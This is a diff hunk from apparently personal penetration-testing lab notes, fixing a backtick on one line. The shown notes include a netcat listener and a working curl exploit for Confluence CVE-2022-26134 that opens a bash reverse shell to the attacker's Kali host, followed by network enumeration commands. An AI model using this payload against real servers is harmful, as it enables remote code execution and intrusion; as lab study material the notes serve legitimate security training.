@@ -1477,7 +1477,7 @@ Reference
   - confluence 192.168.124.63; PGDATABASE01 10.4.124.215; kali 192.168.45.156  
   - `nc -nvlp 4444`  
   - get reserve shell from confluence [CVE-2022-26134](https://www.rapid7.com/blog/post/2022/06/02/active-exploitation-of-confluence-cve-2022-26134/). change confluence server and kali ip.  
-    `curl http://192.168.124.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.156/4444%200%3E%261%27%29.start%28%29%22%29%7D/'
+    `curl http://192.168.124.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.156/4444%200%3E%261%27%29.start%28%29%22%29%7D/`
   - enumerating network interface on CONFLUENCE01 > 192.168.124.63/24, 10.4.124.63/24  
     `ip addr`  
   - enumerating routes on CONFLUENCE01 > 192.168.124.0/24 dev ens192 , 10.4.124.0/24 dev ens224  
